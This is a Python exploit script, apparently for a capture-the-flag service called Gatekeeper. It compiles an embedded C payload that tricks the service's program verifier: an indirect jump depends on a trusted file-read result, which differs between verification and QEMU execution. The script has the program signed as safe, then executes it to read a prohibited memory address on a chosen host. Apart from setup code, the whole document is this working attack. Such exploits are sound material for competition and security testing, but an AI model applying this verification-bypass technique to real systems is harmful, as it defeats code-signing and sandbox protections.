#!/usr/bin/env python3

from __future__ import annotations

import os
import shutil
import sys
import base64
import asyncio
import aiohttp
import tempfile
import argparse
from pathlib import Path

# Allow importing the shared Makefile wrapper from the checker module.
CHECKER_ROOT = Path(__file__).resolve().parents[1] / "checker"
MAKE_DIR = Path(__file__).resolve().parents[1] / "service" / "example_program"
print(CHECKER_ROOT)
if str(CHECKER_ROOT) not in sys.path:
    sys.path.insert(0, str(CHECKER_ROOT))

from proggen.compile import CompileError, make_compile  # type: ignore[import]
from service_client import GatekeeperClient  # type: ignore[import]


def main():
    parser = argparse.ArgumentParser(description="Exploit trusted functions")
    parser.add_argument(
        "--host",
        type=str,
        default="localhost",
        help="Target host to exploit",
    )
    args = parser.parse_args()

    exp_src = r"""
#include "ministd.h"
#include "trusted_lib_api.h"
#include <stdint.h>

void qemu()
{
    TRUSTED_CALL_VOID(mini_printf, "Should be only seen in QEMU! Reading Prohibited address: %llx\n", *(uint64_t*)0x13400000);
}

void verifier()
{
    TRUSTED_CALL_VOID(mini_printf, "Should be only seen in Verifier! Totally safe...\n");
}

ENTRY_POINT_ATTR void start()
{
    char file_data[128] = { 0 };
    uint32_t len = sizeof(file_data);
    int32_t result =
        TRUSTED_CALL(read_file_plain, 0x4141414141414141ULL, (uint8_t*)file_data, &len);

    void* ptrs[2] = { (void*)qemu, (void*)verifier };
    ((void (*)())ptrs[result + 1])();

    ENTRY_POINT_END();
}
    """

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_path = Path(tmpdir)
        src_path = tmp_path / "exploit-verifier-non-symbolic-ret.c"
        src_path.write_text(exp_src)

        out_dir = tmp_path / "out"

        try:
            bin_path = make_compile(
                MAKE_DIR,
                src_path,
                out_dir,
                extra_cflags="-O0",
                target="prog",
                comptime_seed=1,
            )
        except CompileError as exc:
            print(f"failed to compile exploit-verifier-non-symbolic-ret.c: {exc}")
            return

        program_b64 = base64.b64encode(bin_path.read_bytes()).decode()

    client = GatekeeperClient(args.host)
    verify_result = client.verify_program_sync(
        {"program": program_b64},
    )
    print("Verify result:", verify_result)

    execute_result = client.execute_program_sync(
        {"signature": verify_result["signature"], "program": program_b64}
    )
    print("Execution result:", execute_result)


if __name__ == "__main__":
    main()
